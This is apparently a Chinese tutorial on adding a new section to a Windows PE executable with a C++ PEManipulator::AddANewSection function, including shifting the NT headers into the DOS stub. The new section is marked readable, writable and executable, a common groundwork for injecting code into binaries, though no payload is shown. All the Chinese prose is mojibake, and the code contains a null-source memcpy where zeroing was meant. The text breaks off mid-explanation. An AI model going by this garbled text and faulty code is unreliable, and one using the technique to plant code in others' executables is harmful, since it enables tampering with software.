DOSå¤´çš„å¤§å°ï¼ˆDOS MZ+DOS Stubï¼‰DWORD SizeNtHdr = sizeof(ImagePEHeaders.NtHdr-&gt;Signature) + IMAGE_SIZEOF_FILE_HEADER + ImagePEHeaders.PeHdr-&gt;SizeOfOptionalHeader; //NTå¤´çš„æ€»å¤§å°DWORD SizeSectionHeaders = ImagePEHeaders.PeHdr-&gt;NumberOfSections * sizeof(IMAGE_SECTION_HEADER); //èŠ‚è¡¨çš„æ€»å¤§å° DWORD dwAvailableSpace = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfHeaders - SizeDos - SizeNtHdr - SizeSectionHeaders;printf(&quot; [+] Available space after the last section header: %lu bytes &quot;, dwAvailableSpace); ç©ºé—´å¤Ÿå°±æ–°å¢èŠ‚è¡¨ä¿¡æ¯ã€‚ å‰©ä½™ç©ºé—´ä¸å¤Ÿæ—¶ï¼Œè¦åˆ©ç”¨Dos Stubçš„ç©ºé—´ï¼Œè¿™ä¼šå‡ºç°ä¸¤ç§æƒ…å†µã€‚æƒ…å†µä¸€ï¼šå³ä½¿NTå¤´ä¸Šç§»å®Œå…¨å ç”¨Dos Stubå…¨éƒ¨çš„ç©ºé—´ï¼Œå¯ç”¨ç©ºé—´ä¹Ÿä¸å¤Ÿ80å­—èŠ‚ã€‚ ä»£ç å®ç°ï¼šå®åœ¨æ²¡æ³•æ–°å¢èŠ‚ï¼Œé‚£ä¹ˆå°±é€€å‡ºå‡½æ•°ã€‚ 1234567//dwAvailableSpace + SizeDosStub çš„ç©ºé—´ &lt;80ï¼Œå³ä½¿ä¸Šç§»NTå¤´ï¼Œç©ºé—´ä¹Ÿä¸å¤ŸDWORD SizeDosStub = ImagePEHeaders.DosHdr-&gt;e_lfanew - sizeof(IMAGE_DOS_HEADER); //DOS Stubå—å¤§å°if (dwAvailableSpace + SizeDosStub &lt; 80)&#123; printf(&quot; [!] Not enough space to add a new section header even after potential NT header shift. Required: 80 bytes, available: %lu bytes. &quot;, dwAvailableSpace + SizeDosStub); return FALSE;&#125; ä¸Šé¢çš„åˆ¤æ–­æ¡ä»¶1å³ä½¿æ»¡è¶³ï¼ˆå‰©ä½™ç©ºé—´&gt;80å­—èŠ‚ï¼‰ï¼Œä¹Ÿä¸èƒ½å°±å¼€å§‹æ–°åŠ èŠ‚è¡¨ï¼Œæ¯”å¦‚winxpä¸‹çš„notepadå‰©ä½™ç©ºé—´æ˜¯æœ‰çš„ï¼Œä½†ç¼–è¯‘å™¨åœ¨èŠ‚è¡¨ååŠ äº†ä¸€å †æ•°æ®ï¼Œæˆ‘ä»¬æ²¡åŠæ³•è¯æ˜è¿™äº›æ•°æ®æ²¡æœ‰ç”¨ï¼Œæ‰€ä»¥ä¿é™©åšæ³•æ˜¯ä¸è¦†ç›–ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿å‰©ä½™ç©ºé—´&gt;80å­—èŠ‚ï¼Œä½†å› ä¸ºç¼–è¯‘å™¨æ’å…¥äº†æ•°æ®ï¼Œä¹Ÿç®—ä½œæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´æ–°æ·»ä¸€ä¸ªèŠ‚è¡¨ã€‚æ‰€ä»¥å½“æ¡ä»¶1æ»¡è¶³æ—¶ï¼Œè¿˜è¦ç»§ç»­åŠ ä¸Šåˆ¤æ–­æ¡ä»¶2ï¼šåé¢çš„80å­—èŠ‚æ˜¯å¦æœ‰ç¼–è¯‘å™¨æ’å…¥çš„æ•°æ®ã€‚å…·ä½“ä»£ç å°±æ˜¯åˆ¤æ–­æ˜¯å¦èŠ‚è¡¨åçš„ç©ºé—´æ˜¯å¦åªåŒ…å«é›¶ã€‚ ä¹Ÿé‡åˆ°è¿‡èŠ‚è¡¨ç»“å°¾çš„ä¸æ˜¯å…¨0èŠ‚è¡¨ï¼Œä¼šæœ‰ä¸¤ä¸ª40ã€‚è¿™ç§æƒ…å†µæ²¡æ³•å†è¿›è¡Œåˆ†ç±»ï¼Œä¹Ÿè¿›è¡ŒNTå¤´ä¸Šç§»å¤„ç† 1234// æ£€æŸ¥ç°æœ‰èŠ‚è¡¨åçš„80å­—èŠ‚æ˜¯å¦å…¨ä¸º0ï¼Œæ˜¯å¦æœ‰æ•°æ®BYTE zeroData[80] = &#123; 0 &#125;;BYTE* checkSpace = (BYTE*)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders;bool isDataClean = memcmp(checkSpace, zeroData, 80) == 0; æƒ…å†µäºŒï¼šé€šè¿‡NTå¤´ä¸Šç§»èƒ½è·å¾—è¶³å¤Ÿçš„ç©ºé—´ã€‚ å…·ä½“ä»£ç ï¼šæç¤ºè¾“å‡ºè¯´ç©ºé—´ä¸å¤Ÿï¼Œè¯¢é—®ç”¨æˆ·æ˜¯å¦è¿›è¡ŒNTå¤´ä¸Šç§»æ“ä½œï¼Œç”¨æˆ·è¾“å…¥éæ³•çš„è¯è¦é‡æ–°è¾“å…¥ ç”¨æˆ·è¾“å…¥å°å†™yã€å¤§å†™Yï¼Œå›è½¦å°±è¿›è¡Œ ç”¨æˆ·è¾“å…¥å°å†™nã€å¤§å†™Nï¼Œå°±ä¸è¿›è¡Œï¼Œé€€å‡ºå‡½æ•° ç©ºé—´ä¸å¤Ÿï¼Œè¯¢é—®ç”¨æˆ·æ˜¯å¦ä¸Šç§»NTå¤´ï¼ˆå¸¦éæ³•è¾“å…¥æ£€æŸ¥ï¼‰1234567891011121314151617181920212223242526if (dwAvailableSpace &lt; 80 || !isDataClean)&#123; printf(&quot; [!] Not enough space to add a new section header. Required: 80 bytes. &quot;); printf(&quot; [*] Do you want to shift the NT Headers upwards to make space? [Y/n]: &quot;); char cResponse; while (true) &#123; scanf_s(&quot; %c&quot;, &amp;cResponse, 1); if (cResponse == &#x27; &#x27; || cResponse == &#x27;Y&#x27; || cResponse == &#x27;y&#x27;) &#123; cResponse = &#x27;Y&#x27;; break; &#125; else if (cResponse == &#x27;N&#x27; || cResponse == &#x27;n&#x27;) &#123; printf(&quot; Operation cancelled by user. &quot;); return FALSE; &#125; else &#123; printf(&quot; Invalid input. Please enter Y (yes) or N (no): &quot;); &#125; &#125; //...&#125; ç®—Dos Stubå¤§å°å¹¶è¾“å‡ºè¿™ä¸ªå€¼ã€‚è®©ç”¨æˆ·èƒ½çŸ¥é“ç§»åŠ¨çš„å­—èŠ‚æ•°èŒƒå›´[80 - dwAvailableSpaceï¼ŒDosStubå—å¤§å°]ï¼Œè®©ç”¨æˆ·è¾“è¦ä¸Šç§»å¤šå°‘å­—èŠ‚ã€‚å¦‚æœè¾“å…¥éæ³•ï¼Œè¦æ±‚é‡è¾“ è¾“å‡ºæ˜¾ç¤ºèƒ½ä¸Šç§»NTå¤´çš„èŒƒå›´å¹¶è®©ç”¨æˆ·é€‰æ‹©ä¸Šç§»å¤šå°‘å­—èŠ‚ï¼ˆæœ‰éæ³•è¾“å…¥æ£€æŸ¥ï¼‰1234567891011121314151617// èƒ½å°†NTå¤´ä¸Šç§»å¤šå°‘DWORD SizeDosStub = ImagePEHeaders.DosHdr-&gt;e_lfanew - sizeof(IMAGE_DOS_HEADER);printf(&quot; Maximum shift size available: %lu bytes &quot;, SizeDosStub);DWORD dwShiftSize;do &#123; printf(&quot; Enter the number of bytes to shift NT Headers (up to %lu bytes, minimum required: %lu): &quot;, SizeDosStub, 80 - dwAvailableSpace); scanf_s(&quot;%lu&quot;, &amp;dwShiftSize); if (dwShiftSize &lt; 80 - dwAvailableSpace || dwShiftSize &gt; SizeDosStub) &#123; printf(&quot; Invalid shift size. Please enter a value within the valid range. &quot;); &#125; else &#123; break; &#125;&#125; while (true); ä¸Šç§»NTå¤´ ç”¨memcpyä»NTå¤´èµ·æ‹·ï¼ˆNTå¤´æ€»å¤§å°+èŠ‚è¡¨å¤§å°ï¼‰å¤§å°åˆ°ï¼ˆNTå¤´-ä¸Šç§»å­—èŠ‚æ•°ï¼‰ï¼› å°†åŸèŠ‚è¡¨åshiftSizeçš„å­—èŠ‚éƒ½ç½®0ï¼Œå› ä¸ºåŸæ¥çš„æ•°æ®å˜åƒåœ¾æ•°æ®äº†ï¼Œç½®0ï¼ˆåŸèŠ‚è¡¨æœ«å°¾å¾€å‰ç®—dwShiftSizeçš„å­—èŠ‚æ•°ç½®ä¸º0ï¼‰ 123//ä¸Šç§»NTå¤´memcpy((LPBYTE)ImagePEHeaders.NtHdr - dwShiftSize, ImagePEHeaders.NtHdr, SizeNtHdr + SizeSectionHeaders);memset((LPBYTE)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders - dwShiftSize, 0, dwShiftSize); // Clear the old area ä¿®æ”¹e_lfanewæŒ‡å‘æ–°çš„NTå¤´èµ·å§‹ä½ç½® 1ImagePEHeaders.DosHdr-&gt;e_lfanew -= dwShiftSize; // Update the e_lfanew to point to the new NT header start ä¸Šç§»NTå¤´çš„æ“ä½œå®Œæ¯•åï¼Œè¦é‡æ–°è·å–PEç›¸å…³çš„å¤´æŒ‡é’ˆï¼Œå› ä¸ºNTå¤´æœ‰å˜åŒ–ã€‚åé¢è¦ç”¨åˆ°è¿™äº›PEå¤´æ¥æ–°å¢æˆå‘˜ 12// Re-extract pointers due to NT header movementExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders); å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778//1ã€åˆ¤æ–­ç°æœ‰çš„èŠ‚è¡¨åæ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´æ–°æ·»åŠ ä¸€ä¸ªèŠ‚è¡¨// è®¡ç®—å„ä¸ªéƒ¨åˆ†çš„å¤§å°DWORD SizeDos = ImagePEHeaders.DosHdr-&gt;e_lfanew; // DOSå¤´çš„å¤§å°ï¼ˆDOS MZ+DOS Stubï¼‰DWORD SizeNtHdr = sizeof(ImagePEHeaders.NtHdr-&gt;Signature) + IMAGE_SIZEOF_FILE_HEADER + ImagePEHeaders.PeHdr-&gt;SizeOfOptionalHeader; //NTå¤´çš„æ€»å¤§å°DWORD SizeSectionHeaders = ImagePEHeaders.PeHdr-&gt;NumberOfSections * sizeof(IMAGE_SECTION_HEADER); //èŠ‚è¡¨çš„æ€»å¤§å° DWORD dwAvailableSpace = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfHeaders - SizeDos - SizeNtHdr - SizeSectionHeaders;printf(&quot; [+] Available space after the last section header: %lu bytes &quot;, dwAvailableSpace); //dwAvailableSpace + SizeDosStub çš„ç©ºé—´ &lt;80ï¼Œå³ä½¿ä¸Šç§»NTå¤´ï¼Œç©ºé—´ä¹Ÿä¸å¤ŸDWORD SizeDosStub = ImagePEHeaders.DosHdr-&gt;e_lfanew - sizeof(IMAGE_DOS_HEADER); //DOS Stubå—å¤§å°if (dwAvailableSpace + SizeDosStub &lt; 80)&#123; printf(&quot; [!] Not enough space to add a new section header even after potential NT header shift. Required: 80 bytes, available: %lu bytes. &quot;, dwAvailableSpace + SizeDosStub); return FALSE;&#125; // æ£€æŸ¥ç°æœ‰èŠ‚è¡¨åçš„80å­—èŠ‚æ˜¯å¦å…¨ä¸º0ï¼Œæ˜¯å¦æœ‰æ•°æ®BYTE zeroData[80] = &#123; 0 &#125;;BYTE* checkSpace = (BYTE*)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders;bool isDataClean = memcmp(checkSpace, zeroData, 80) == 0; if (dwAvailableSpace &lt; 80 || !isDataClean)&#123; printf(&quot; [!] Not enough space to add a new section header. Required: 80 bytes. &quot;); printf(&quot; [*] Do you want to shift the NT Headers upwards to make space? [Y/n]: &quot;); char cResponse; while (true) &#123; scanf_s(&quot; %c&quot;, &amp;cResponse, 1); if (cResponse == &#x27; &#x27; || cResponse == &#x27;Y&#x27; || cResponse == &#x27;y&#x27;) &#123; cResponse = &#x27;Y&#x27;; break; &#125; else if (cResponse == &#x27;N&#x27; || cResponse == &#x27;n&#x27;) &#123; printf(&quot; Operation cancelled by user. &quot;); return FALSE; &#125; else &#123; printf(&quot; Invalid input. Please enter Y (yes) or N (no): &quot;); &#125; &#125; // èƒ½å°†NTå¤´ä¸Šç§»å¤šå°‘ printf(&quot; Maximum shift size available: %lu bytes &quot;, SizeDosStub); DWORD dwShiftSize; do &#123; printf(&quot; Enter the number of bytes to shift NT Headers (up to %lu bytes, minimum required: %lu): &quot;, SizeDosStub, 80 - dwAvailableSpace); scanf_s(&quot;%lu&quot;, &amp;dwShiftSize); if (dwShiftSize &lt; 80 - dwAvailableSpace || dwShiftSize &gt; SizeDosStub) &#123; printf(&quot; Invalid shift size. Please enter a value within the valid range. &quot;); &#125; else &#123; break; &#125; &#125; while (true); //ä¸Šç§»NTå¤´ memcpy((LPBYTE)ImagePEHeaders.NtHdr - dwShiftSize, ImagePEHeaders.NtHdr, SizeNtHdr + SizeSectionHeaders); memset((LPBYTE)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders - dwShiftSize, 0, dwShiftSize); // Clear the old area // Update the e_lfanew to point to the new NT header start ImagePEHeaders.DosHdr-&gt;e_lfanew -= dwShiftSize; printf(&quot; NT Headers have been shifted up by %lu bytes. &quot;, dwShiftSize); // Re-extract pointers due to NT header movement ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders);&#125; åœ¨èŠ‚è¡¨ä¸­æ–°å¢ä¸€ä¸ªæˆå‘˜ï¼Œå¡«å†™å„ä¸ªå­—æ®µ VirtualSizeå’ŒSizeOfRawDataéƒ½å†™æˆ0x1000ä¸¥è°¨ç‚¹12345678910111213141516//2ã€åœ¨èŠ‚è¡¨ä¸­æ–°å¢ä¸€ä¸ªæˆå‘˜ï¼Œå¡«å†™å„ä¸ªå­—æ®µPIMAGE_SECTION_HEADER pSecHdrToLastSection = ImagePEHeaders.SecHdr + (ImagePEHeaders.PeHdr-&gt;NumberOfSections - 1);//æœ€åä¸€ä¸ªèŠ‚è¡¨ IMAGE_SECTION_HEADER NewSectionTable = &#123; 0 &#125;; //ä¸é‡è¦çš„é‚£äº›å­—æ®µå·²ä¸º0äº†memcpy(NewSectionTable.Name, &quot;.NewSec&quot;, 8); // æ³¨æ„ï¼šæœ€å¤š8ä¸ªå­—ç¬¦ï¼Œä¸å«NULLç»ˆæ­¢ç¬¦ //NewSectionTable.Name = &quot;.NewSec&quot;;NewSectionTable.Misc.VirtualSize = 0x1000; //æ–°å¢0x1000å¤§å°NewSectionTable.VirtualAddress = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage;//NewSectionTable.VirtualAddress = pSecHdrToLastSection-&gt; //è®¡ç®—æ–¹æ³•äºŒï¼Œéœ€è¦è®¡ç®—å¯¹é½å€¼å‡½æ•°,,To doNewSectionTable.SizeOfRawData = 0x1000; //æ–°å¢0x1000å¤§å°NewSectionTable.PointerToRawData = pSecHdrToLastSection-&gt;PointerToRawData + pSecHdrToLastSection-&gt;SizeOfRawData;NewSectionTable.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE; //è¯¥å—åŒ…å«æ‰§è¡Œä»£ç ï¼Œå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œ PIMAGE_SECTION_HEADER pNewSection = ImagePEHeaders.SecHdr + ImagePEHeaders.PeHdr-&gt;NumberOfSections;memcpy(pNewSection, &amp;NewSectionTable, sizeof(IMAGE_SECTION_HEADER)); //å°†æ–°å¢çš„èŠ‚è¡¨è¿½åŠ åˆ°æœ€åä¸€ä¸ªèŠ‚è¡¨åé¢memcpy(pNewSection + 1, 0, sizeof(IMAGE_SECTION_HEADER)); //å†æ·»åŠ ä¸€ä¸ªå…¨ä¸º0çš„èŠ‚è¡¨æ”¶å°¾ï¼Œä½œä¸ºç»“æŸæ ‡å¿—å‡è®¾å‡½æ•°æ¥æ”¶ä¸€ä¸ªå‚æ•°DWORDç±»å‹çš„å‚æ•°dwSectionSizeInFileï¼Œè¡¨ç¤ºæ–°å¢èŠ‚çš„å®é™…å¤§å° é‚£ä¹ˆVirtualSizeå’ŒSizeOfRawDataä¼šå˜ä¸ºï¼š 123NewSectionTable.Misc.VirtualSize = dwNewSectionSize; //å®é™…çš„å¤§å° NewSectionTable.SizeOfRawData = AlignUp(dwNewSectionSize, ImagePEHeaders.OptionalPeHdr-&gt;FileAlignment); //æŒ‰FileAlignmentå¯¹é½åçš„å¤§å° æ›´æ–°SizeOfImageä¼šå˜ä¸ºï¼š 1ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += AlignUp(newSectionSize, ImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); AlignUpå‡½æ•°æ˜¯è®¡ç®—ä¸€ä¸ªæ•°ç¦»ä¸€ä¸ªå¯¹é½å€¼æœ€è¿‘çš„æ•°æ˜¯å¤šå°‘ 123456// This function aligns a given size up // to the nearest multiple of the alignment value.DWORD AlignUp(DWORD dwSize, DWORD dwAlignment) &#123;\treturn (dwSize + dwAlignment - 1) &amp; ~(dwAlignment - 1);&#125; æ›´æ–°èŠ‚è¡¨æ•°é‡ 12// 3. æ›´æ–°èŠ‚è¡¨æ•°é‡++ImagePEHeaders.PeHdr-&gt;NumberOfSections; æ›´æ–°SizeOfImageçš„å¤§å° 12//4. æ›´æ–°SizeOfImageçš„å¤§å°ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += NewSectionTable.Misc.VirtualSize; å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122BOOL PEManipulator::AddANewSection()&#123; PEHeaders ImagePEHeaders&#123; nullptr &#125;; if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders)) &#123; printf(&quot; [!] (In %s) Extract the PE Pointers of ImageBuffer failed &quot;, __func__); return FALSE; &#125; printf(&quot; [+] Extract the PE Pointers of ImageBuffer successfully. &quot;); if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // æ£€æŸ¥æ‰€æœ‰PEHeadersæˆå‘˜æ˜¯å¦æœ‰æ•ˆï¼Œé¿å…ç¼–è¯‘å™¨è­¦å‘Š !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; //1ã€åˆ¤æ–­ç°æœ‰çš„èŠ‚è¡¨åæ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´æ–°æ·»åŠ ä¸€ä¸ªèŠ‚è¡¨ // è®¡ç®—å„ä¸ªéƒ¨åˆ†çš„å¤§å° DWORD SizeDos = ImagePEHeaders.DosHdr-&gt;e_lfanew; // DOSå¤´çš„å¤§å°ï¼ˆDOS MZ+DOS Stubï¼‰ DWORD SizeNtHdr = sizeof(ImagePEHeaders.NtHdr-&gt;Signature) + IMAGE_SIZEOF_FILE_HEADER + ImagePEHeaders.PeHdr-&gt;SizeOfOptionalHeader; //NTå¤´çš„æ€»å¤§å° DWORD SizeSectionHeaders = ImagePEHeaders.PeHdr-&gt;NumberOfSections * sizeof(IMAGE_SECTION_HEADER); //èŠ‚è¡¨çš„æ€»å¤§å° DWORD dwAvailableSpace = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfHeaders - SizeDos - SizeNtHdr - SizeSectionHeaders; printf(&quot; [+] Available space after the last section header: %lu bytes &quot;, dwAvailableSpace); //dwAvailableSpace + SizeDosStub çš„ç©ºé—´ &lt;80ï¼Œå³ä½¿ä¸Šç§»NTå¤´ï¼Œç©ºé—´ä¹Ÿä¸å¤Ÿ DWORD SizeDosStub = ImagePEHeaders.DosHdr-&gt;e_lfanew - sizeof(IMAGE_DOS_HEADER); //DOS Stubå—å¤§å° if (dwAvailableSpace + SizeDosStub &lt; 80) &#123; printf(&quot; [!] Not enough space to add a new section header even after potential NT header shift. Required: 80 bytes, available: %lu bytes. &quot;, dwAvailableSpace + SizeDosStub); return FALSE; &#125; // æ£€æŸ¥ç°æœ‰èŠ‚è¡¨åçš„80å­—èŠ‚æ˜¯å¦å…¨ä¸º0ï¼Œæ˜¯å¦æœ‰æ•°æ® BYTE zeroData[80] = &#123; 0 &#125;; BYTE* checkSpace = (BYTE*)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders; bool isDataClean = memcmp(checkSpace, zeroData, 80) == 0; if (dwAvailableSpace &lt; 80 || !isDataClean) &#123; printf(&quot; [!] Not enough space to add a new section header. Required: 80 bytes. &quot;); printf(&quot; [*] Do you want to shift the NT Headers upwards to make space? [Y/n]: &quot;); char cResponse; while (true) &#123; scanf_s(&quot; %c&quot;, &amp;cResponse, 1); if (cResponse == &#x27; &#x27; || cResponse == &#x27;Y&#x27; || cResponse == &#x27;y&#x27;) &#123; cResponse = &#x27;Y&#x27;; break; &#125; else if (cResponse == &#x27;N&#x27; || cResponse == &#x27;n&#x27;) &#123; printf(&quot; Operation cancelled by user. &quot;); return FALSE; &#125; else &#123; printf(&quot; Invalid input. Please enter Y (yes) or N (no): &quot;); &#125; &#125; // èƒ½å°†NTå¤´ä¸Šç§»å¤šå°‘ printf(&quot; Maximum shift size available: %lu bytes &quot;, SizeDosStub); DWORD dwShiftSize; do &#123; printf(&quot; Enter the number of bytes to shift NT Headers (up to %lu bytes, minimum required: %lu): &quot;, SizeDosStub, 80 - dwAvailableSpace); scanf_s(&quot;%lu&quot;, &amp;dwShiftSize); if (dwShiftSize &lt; 80 - dwAvailableSpace || dwShiftSize &gt; SizeDosStub) &#123; printf(&quot; Invalid shift size. Please enter a value within the valid range. &quot;); &#125; else &#123; break; &#125; &#125; while (true); //ä¸Šç§»NTå¤´ memcpy((LPBYTE)ImagePEHeaders.NtHdr - dwShiftSize, ImagePEHeaders.NtHdr, SizeNtHdr + SizeSectionHeaders); memset((LPBYTE)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders - dwShiftSize, 0, dwShiftSize); // Clear the old area // Update the e_lfanew to point to the new NT header start ImagePEHeaders.DosHdr-&gt;e_lfanew -= dwShiftSize; printf(&quot; NT Headers have been shifted up by %lu bytes. &quot;, dwShiftSize); // Re-extract pointers due to NT header movement ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders); &#125; //2ã€åœ¨èŠ‚è¡¨ä¸­æ–°å¢ä¸€ä¸ªæˆå‘˜ï¼Œå¡«å†™å„ä¸ªå­—æ®µ PIMAGE_SECTION_HEADER pSecHdrToLastSection = ImagePEHeaders.SecHdr + (ImagePEHeaders.PeHdr-&gt;NumberOfSections - 1);//æœ€åä¸€ä¸ªèŠ‚è¡¨ IMAGE_SECTION_HEADER NewSectionTable = &#123; 0 &#125;; //ä¸é‡è¦çš„é‚£äº›å­—æ®µå·²ä¸º0äº† memcpy(NewSectionTable.Name, &quot;.NewSec&quot;, 8); // æ³¨æ„ï¼šæœ€å¤š8ä¸ªå­—ç¬¦ï¼Œä¸å«NULLç»ˆæ­¢ç¬¦ //NewSectionTable.Name = &quot;.NewSec&quot;; NewSectionTable.Misc.VirtualSize = 0x1000; //æ–°å¢0x1000å¤§å° NewSectionTable.VirtualAddress = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage; //NewSectionTable.VirtualAddress = pSecHdrToLastSection-&gt; //è®¡ç®—æ–¹æ³•äºŒï¼Œéœ€è¦è®¡ç®—å¯¹é½å€¼å‡½æ•°,,To do NewSectionTable.SizeOfRawData = 0x1000; //æ–°å¢0x1000å¤§å° NewSectionTable.PointerToRawData = pSecHdrToLastSection-&gt;PointerToRawData + pSecHdrToLastSection-&gt;SizeOfRawData; NewSectionTable.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE; //è¯¥å—åŒ…å«æ‰§è¡Œä»£ç ï¼Œå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œ PIMAGE_SECTION_HEADER pNewSection = ImagePEHeaders.SecHdr + ImagePEHeaders.PeHdr-&gt;NumberOfSections; memcpy(pNewSection, &amp;NewSectionTable, sizeof(IMAGE_SECTION_HEADER)); //å°†æ–°å¢çš„èŠ‚è¡¨è¿½åŠ åˆ°æœ€åä¸€ä¸ªèŠ‚è¡¨åé¢ memcpy(pNewSection + 1, 0, sizeof(IMAGE_SECTION_HEADER)); //å†æ·»åŠ ä¸€ä¸ªå…¨ä¸º0çš„èŠ‚è¡¨æ”¶å°¾ï¼Œä½œä¸ºç»“æŸæ ‡å¿— // 3. æ›´æ–°èŠ‚è¡¨æ•°é‡ ++ImagePEHeaders.PeHdr-&gt;NumberOfSections; //4. æ›´æ–°SizeOfImageçš„å¤§å° ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += NewSectionTable.Misc.VirtualSize; printf(&quot; [+] A new section has been added successfully. &quot;); return TRUE;&#125; æµ‹è¯• File-&gt;FileBuffer-&gt;ImageBufferï¼Œåœ¨ImageBufferä¸Šæ–°å¢èŠ‚è¡¨ä¿¡æ¯ï¼ŒImageBuffer-&gt;NewImageBuffer-&gt;NewFileBuffer-&gt;å­˜ç›˜ æ„Ÿè§‰ä¸ç”¨é‚£ä¹ˆéº»çƒ¦ï¼Œæ–°å¢ä¸€å—åŸSizeOfImage+æ–°çš„å¤§å°ï¼Œæ•´å—å¯¹æ‹·ï¼Œç„¶åæ”¹ã€‚ä½†ä¹Ÿæœ‰é—®é¢˜ï¼Œå¦‚æœæ²¡æ³•æ”¹çš„è¯ï¼Œå·²ç»ç”³è¯·NewImageBufferäº†ã€‚ åœ¨ImageBufferä¸ŠåŠ ä»£ç ä¼šæ¯”è¾ƒæ–¹ä¾¿ã€‚å¦‚æœä»…ä»…æ˜¯æ–°å¢èŠ‚ï¼Œå¯ä»¥åœ¨FileBufferä¸Šä¿®æ”¹ç›¸å…³çš„ä¿¡æ¯ï¼Œç„¶åæ–°å¢ä¸€ä¸ªBufferï¼Œä»FileBufferæ‹·è¿‡å»ï¼Œå†å­˜ç›˜å³å¯ã€‚ fflush(stdout); ç¡®ä¿åœ¨ç”¨æˆ·çœ‹åˆ°è¾“å…¥æç¤ºä¹‹å‰æ²¡æœ‰è¾“å‡ºç¼“å­˜çš„å»¶è¿Ÿã€‚ scanf(&quot; %c&quot;, &amp;cResponse); å°è¯•è¯»å–ä¸€ä¸ªå­—ç¬¦ï¼Œå‰é¢çš„ç©ºæ ¼ç”¨äºå¿½ç•¥ä»»ä½•å‰å¯¼ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¹‹å‰çš„å›è½¦ã€‚ å¦‚æœscanfå› ç”¨æˆ·åªæŒ‰å›è½¦è€Œæ²¡æœ‰è¯»åˆ°å­—ç¬¦ï¼Œresultå°†æ˜¯0ã€‚æ­¤æ—¶å¯ä»¥è®¾ç½®cResponseä¸ºâ€™Yâ€™æ¥æ¨¡æ‹Ÿé»˜è®¤é€‰æ‹©ã€‚ ä½¿ç”¨fflush(stdin);åœ¨æ¯æ¬¡å¾ªç¯è¿­ä»£åæ¸…ç©ºæ ‡å‡†è¾“å…¥ï¼Œè¿™é˜²æ­¢ä¹‹å‰çš„é”™è¯¯è¾“å…¥å½±å“åˆ°åç»­çš„è¯»å–ï¼ˆæ³¨æ„ï¼šfflush(stdin);åœ¨ä¸€äº›ç¯å¢ƒä¸­æ˜¯æœªå®šä¹‰è¡Œä¸ºï¼Œä½†åœ¨å¾ˆå¤šç¼–è¯‘å™¨ä¸Šå¯ä»¥æ­£å¸¸å·¥ä½œï¼‰ã€‚å¦‚æœä½ çš„ç¯å¢ƒä¸­fflush(stdin);æ˜¯æœªå®šä¹‰çš„ï¼Œä½ å¯èƒ½éœ€è¦æ‰¾åˆ°æ›¿ä»£æ–¹æ³•æ¥æ¸…é™¤è¾“å…¥ç¼“å†²åŒºã€‚ å¾ªç¯æŒç»­ç›´åˆ°è¾“å…¥è¢«ç¡®è®¤ä¸ºæœ‰æ•ˆã€‚ scanf_s è¦æ±‚æŒ‡å®šæ¯ä¸ªæ¥æ”¶ç¼“å†²åŒºçš„å¤§å°ï¼Œå¯¹äºå•ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬ä½¿ç”¨1ä½œä¸ºå¤§å°ã€‚ while (getchar() != ' '); ç”¨æ¥æ¸…ç©ºè¾“å…¥ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰ä¹‹å‰çš„é”™è¯¯è¾“å…¥éƒ½è¢«æ¸…é™¤ï¼Œè¿™é¿å…äº†ä½¿ç”¨fflush(stdin);çš„ä¸ç¡®å®šæ€§ã€‚ AlignUPå‡½æ•°è§£é‡Šï¼š AlignUpå‡½æ•°çš„å®ç°ä¸»è¦æ˜¯åˆ©ç”¨ä½æ“ä½œæ¥ç¡®ä¿ä¸€ä¸ªç»™å®šçš„æ•°å€¼æŒ‰ç…§æŒ‡å®šçš„å¯¹é½å•ä½å‘ä¸Šå¯¹é½ã€‚ä¸‹é¢æ˜¯å‡½æ•°çš„è§£é‡Šå’Œé€æ­¥è¯´æ˜ï¼š AlignUpå‡½æ•°é€»è¾‘ 123DWORD AlignUp(DWORD size, DWORD alignment) &#123; return (size + alignment - 1) &amp; ~(alignment - 1);&#125; æ­¥éª¤è§£é‡Š size + alignment - 1ï¼š 